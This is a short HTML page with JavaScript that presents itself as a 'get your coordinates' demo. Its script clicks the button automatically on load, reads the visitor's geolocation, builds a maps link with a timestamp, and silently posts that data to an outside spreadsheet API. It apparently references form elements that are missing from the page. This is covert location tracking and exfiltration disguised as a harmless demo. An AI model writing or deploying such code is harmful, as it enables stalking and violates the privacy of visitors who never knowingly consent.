<!DOCTYPE html>
<html>
<body>

<p>Click the button to get your coordinates.</p>

<button onclick="getLocation()" id="getloc">Try It</button>

<p id="demo"></p>

<script>
  get_loc=document.getElementById("getloc");
  get_loc.click();
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  x.innerHTML = "Latitude: " + position.coords.latitude + 
  "<br>Longitude: " + position.coords.longitude;

var today = new Date();
var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
var dateTime = date+' '+time;
document.getElementById("time_stamp").value=dateTime;



var latlon = position.coords.latitude + "," + position.coords.longitude;

  var img_url = "https://www.google.com/maps/search/?api=1&query="+latlon;
document.getElementById("lat").value=img_url;
//document.getElementById("lon").value=position.coords.longitude;


SubForm();

      function SubForm (){
      $.ajax({
        url:"https://api.apispreadsheets.com/data/14714/",
        type:"post",
        data:$("#myForm").serializeArray(),
        success: function(){
          console.log("Form Data Submitted :)")
        },
        error: function(){
          console.log("There was an error :(")
        }
      });
    }


}
</script>
